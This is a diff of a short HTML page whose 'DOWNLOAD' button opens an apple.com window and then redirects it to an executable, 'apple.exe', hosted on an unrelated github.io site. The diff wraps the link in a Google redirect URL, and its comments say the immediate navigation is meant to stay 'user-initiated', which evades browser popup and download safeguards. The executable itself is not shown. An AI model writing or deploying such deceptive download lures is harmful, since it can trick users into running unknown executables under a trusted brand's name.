@@ -1,12 +1,19 @@
+<!DOCTYPE html>
+<html>
+<body>
+
 <script>
 function a() {
-  let win = window.open('https://apple.com', 'x');
+  // User interaction langsung
+  let win = window.open('https://apple.com', '_blank');
 
-  win.onload = function () {
-    win.location.href =
-      'https://ecdnts-del.github.io/test-apk/apple.exe';
-  };
+  // Immediate navigation (masih dianggap user‑initiated)
+  win.location.href =
+    'https://www.google.com/url?q=https%3A%2F%2Fecdnts-del.github.io%2Ftest-apk%2Fapple.exe&sa=D&sntz=1&usg=AOvVaw1T8ZmQt3x7S7E2wgJuyMLe';
 }
 </script>
 
 <input type="button" value="DOWNLOAD" onclick="a()">
+
+</body>
+</html>
